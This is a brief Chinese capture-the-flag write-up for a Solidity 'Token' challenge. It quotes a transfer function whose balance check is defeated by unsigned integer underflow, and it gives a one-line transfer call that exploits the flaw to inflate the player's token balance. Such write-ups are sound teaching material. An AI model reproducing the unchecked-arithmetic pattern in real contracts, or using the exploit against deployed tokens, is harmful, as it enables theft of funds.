# Token 


## 题目

```
这一关的目标是攻破下面这个基础 token 合约

你最开始有20个 token, 如果你通过某种方法可以增加你手中的 token 数量,你就可以通过这一关,当然越多越好

  这可能有帮助:

什么是 odometer?
```

## 漏洞


```solidity
require(balances[msg.sender] - _value >= 0);
balances[msg.sender] -= _value;
balances[_to] += _value;
```

整数溢出问题。

使用下溢出既可.

## 解决
本来想直接转到0，但是好像发现不行，直接使用合约的地址吧。
`await contract.transfer(contract.address,21)`

